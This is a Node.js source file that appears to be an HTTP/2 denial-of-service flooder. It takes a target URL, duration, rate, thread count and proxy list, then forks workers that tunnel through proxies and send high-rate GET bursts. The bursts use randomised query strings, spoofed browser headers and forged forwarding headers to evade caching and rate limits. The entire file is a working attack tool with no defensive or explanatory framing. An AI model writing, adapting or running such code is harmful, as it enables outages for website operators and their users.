const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', function (exception) {});

if (process.argv.length < 7) {
    console.log(`Usage: target time rate thread proxyfile`);
    process.exit();
}

const headers = {};

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    Rate: parseInt(process.argv[4]),
    threads: parseInt(process.argv[5]),
    proxyFile: process.argv[6]
};

const sig = [
    'ecdsa_secp256r1_sha256',
    'rsa_pkcs1_sha384',
    'rsa_pkcs1_sha512',
    'hmac_sha256',
    'ecdsa_secp384r1_sha384',
    'rsa_pkcs1_sha1',
    'hmac_sha1'
];

const accept_header = [
    '*/*',
    'image/*',
    'image/webp,image/apng',
    'text/html',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'application/json',
    'application/xml',
    'application/pdf',
    'text/css',
    'application/javascript'
];

const lang_header = [
    'ko-KR',
    'en-US',
    'zh-CN',
    'zh-TW',
    'en-ZA',
    'fr-FR',
    'ja-JP',
    'ar-EG',
    'de-DE',
    'es-ES'
];

const encoding_header = [
    'gzip, deflate, br',
    'deflate',
    'gzip, deflate, lzma, sdch',
    'identity',
    'compress',
    'br'
];

const version = [
    '"Google Chrome";v="113", "Chromium";v="113", ";Not A Brand";v="99"',
    '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
    '"Mozilla Firefox";v="91", ";Not A Brand";v="99"',
    '"Safari";v="14.1.2", "Chrome";v="91.0.4472.164", "Safari";v="14.1.2"',
    '"Opera";v="79.0.4143.22", "Chrome";v="92.0.4515.115", "Opera";v="79.0.4143.22"',
    '"Microsoft Edge";v="92.0.902.62", "Chrome";v="92.0.4515.131", "Microsoft Edge";v="92.0.902.62"'
];

const rateHeaders = [
    { "akamai-origin-hop": randstr(12) },
    { "proxy-client-ip": randstr(12) },
    { "via": randstr(12) },
    { "cluster-ip": randstr(12) },
    { "user-agent": randstr(12) },
    { "x-forwarded-for": randstr(12) },
    { "referer": `https://${randstr(10)}.com` },
    { "cache-control": "no-cache, no-store" }
];

const parsedTarget = url.parse(args.target);
let proxies = readLines(args.proxyFile);
let activeConnections = [];
let intervals = [];

if (cluster.isMaster) {
    console.clear();
    console.log(`Target: ${parsedTarget.host}`);
    console.log(`Duration: ${args.time}`);
    console.log(`Threads: ${args.threads}`);
    console.log(`Requests per second: ${args.Rate}`);

    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }

    process.on('message', (msg) => {
        if (msg === 'stop') {
            for (const id in cluster.workers) {
                cluster.workers[id].send('stop');
            }
        }
    });

} else {
    function runFlooder() {
        const proxyAddr = randomElement(proxies);
        const parsedProxy = proxyAddr.split(":");

        const proxyOptions = {
            host: parsedProxy[0],
            port: ~~parsedProxy[1],
            address: parsedTarget.host + ":443",
            timeout: 10
        };

        const Socker = new class {
            constructor() {}
            HTTP(options, callback) {
                const payload = `CONNECT ${options.address} HTTP/1.1\r\nHost: ${options.address}\r\nConnection: Keep-Alive\r\n\r\n`;
                const buffer = new Buffer.from(payload);
                const connection = net.connect({
                    host: options.host,
                    port: options.port,
                    noDelay: true
                });

                connection.setTimeout(options.timeout * 10000);
                connection.setKeepAlive(true, 60000);

                connection.on("connect", () => {
                    connection.write(buffer);
                });

                connection.on("data", chunk => {
                    const response = chunk.toString("utf-8");
                    const isAlive = response.includes("HTTP/1.1 200");
                    if (!isAlive) {
                        connection.destroy();
                        return callback(undefined, "error: invalid response");
                    }
                    return callback(connection, undefined);
                });

                connection.on("timeout", () => {
                    connection.destroy();
                    return callback(undefined, "error: timeout");
                });

                connection.on("error", error => {
                    connection.destroy();
                    return callback(undefined, "error: " + error);
                });
            }
        };

        Socker.HTTP(proxyOptions, (connection, error) => {
            if (error) {
                connection?.close();
                connection?.destroy();
                return;
            }

            const tlsOptions = {
                secure: true,
                ALPNProtocols: ['h2'],
                ciphers: 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384',
                ecdhCurve: 'P-256:P-384',
                host: parsedTarget.host,
                servername: parsedTarget.host,
                rejectUnauthorized: false,
                socket: connection
            };

            const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
            tlsConn.setKeepAlive(true, 60000);

            const client = http2.connect(parsedTarget.href, {
                protocol: "https:",
                settings: {
                    headerTableSize: 65536,
                    maxConcurrentStreams: 20000,
                    initialWindowSize: 6291456,
                    maxHeaderListSize: 65536,
                    enablePush: false
                },
                createConnection: () => tlsConn
            });

            client.on("connect", () => {
                const interval = setInterval(() => {
                    const dynHeaders = {
                        ":method": "GET",
                        ":authority": parsedTarget.host,
                        ":path": parsedTarget.path + "?" + randstr(15) + "=" + randstr(10),
                        ":scheme": "https",
                        "sec-ch-ua": randomElement(version),
                        "sec-ch-ua-platform": "Windows",
                        "sec-ch-ua-mobile": "?0",
                        "accept-encoding": randomElement(encoding_header),
                        "accept-language": randomElement(lang_header),
                        "upgrade-insecure-requests": "1",
                        "accept": randomElement(accept_header),
                        "sec-fetch-mode": "navigate",
                        "sec-fetch-dest": "document",
                        "sec-fetch-site": "same-origin",
                        "sec-fetch-user": "?1",
                        "x-requested-with": "XMLHttpRequest",
                        ...rateHeaders[Math.floor(Math.random() * rateHeaders.length)]
                    };

                    for (let i = 0; i < args.Rate * 2; i++) {
                        const request = client.request(dynHeaders);
                        request.on("response", () => {
                            request.close();
                            request.destroy();
                        });
                        request.end();
                    }
                }, 200);

                intervals.push(interval);
                activeConnections.push({ client, tlsConn });
            });

            client.on("error", () => {
                client.destroy();
                tlsConn.destroy();
            });
        });
    }

    function stopFlooder() {
        intervals.forEach(clearInterval);
        intervals = [];
        activeConnections.forEach(({ client, tlsConn }) => {
            client.destroy();
            tlsConn.destroy();
        });
        activeConnections = [];
    }

    process.on('message', (msg) => {
        if (msg === 'start') {
            setInterval(runFlooder, 100);
        } else if (msg === 'stop') {
            stopFlooder();
        }
    });

    process.send('ready');
}
